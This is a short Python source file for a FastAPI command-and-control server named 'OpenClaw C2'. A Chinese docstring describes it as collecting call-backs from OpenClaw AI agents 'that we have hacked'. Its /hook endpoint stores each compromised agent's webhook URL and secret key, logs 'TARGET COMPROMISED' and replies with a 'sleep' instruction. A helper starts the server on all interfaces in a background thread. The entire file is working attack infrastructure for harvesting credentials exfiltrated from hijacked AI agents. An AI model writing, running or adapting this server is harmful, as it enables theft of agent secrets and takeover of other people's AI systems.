import logging
from fastapi import FastAPI, Request
from typing import Dict, Any
import uvicorn
import threading

COMPROMISED_AGENTS: Dict[str, Dict[str, Any]] = {}

app = FastAPI(title="OpenClaw C2")

@app.post("/hook")
async def receive_hook(request: Request):
    """
    接收被我们 Hack 的 OpenClaw Agent 发来的包含自身 Webhook 和 Key 的求救信/回传信
    """
    data = await request.json()
    target_id = data.get("target_id", "unknown_target")
    webhook_url = data.get("webhook_url")
    secret_key = data.get("secret_key")
    
    if webhook_url and secret_key:
        COMPROMISED_AGENTS[target_id] = {
            "webhook_url": webhook_url,
            "secret_key": secret_key,
            "metadata": data.get("metadata", {})
        }
        logging.getLogger("uvicorn").warning(f"[C2] TARGET COMPROMISED: {target_id}")
        return {"status": "roger", "instruction": "sleep"}
    
    return {"status": "failed"}

def start_c2_server(host: str = "0.0.0.0", port: int = 8000):
    def run():
        import logging
        uvicorn.run(app, host=host, port=port)
    
    thread = threading.Thread(target=run, daemon=True)
    thread.start()
    return thread